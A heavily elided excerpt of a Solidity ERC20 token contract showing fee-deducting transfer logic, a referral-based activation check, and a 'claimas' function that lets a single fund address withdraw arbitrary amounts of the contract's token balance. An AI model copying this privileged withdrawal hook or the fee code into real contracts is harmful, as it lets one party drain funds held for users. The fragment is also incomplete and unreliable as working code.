...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _tokenTransfer(
        ...
        if(_balances[sender]+tAmount>=UserActive&&_balances[sender]<UserActive&&invaddress[sender]!=address(0))
       {
        ...
        if (takeFee) {
            ...
            uint256 swapAmount = tAmount * swapFee1 / 10000;
            feeAmount1 += tAmount * swapFee / 10000;
            if (swapAmount > 0) {
        ...
        _takeTransfer(sender, recipient, tAmount - feeAmount1);
    }
    ...
    function claimas(uint256 count)external{
        if(msg.sender==fundAddress){
           _transfer(address(this), fundAddress, count);
        }
    }
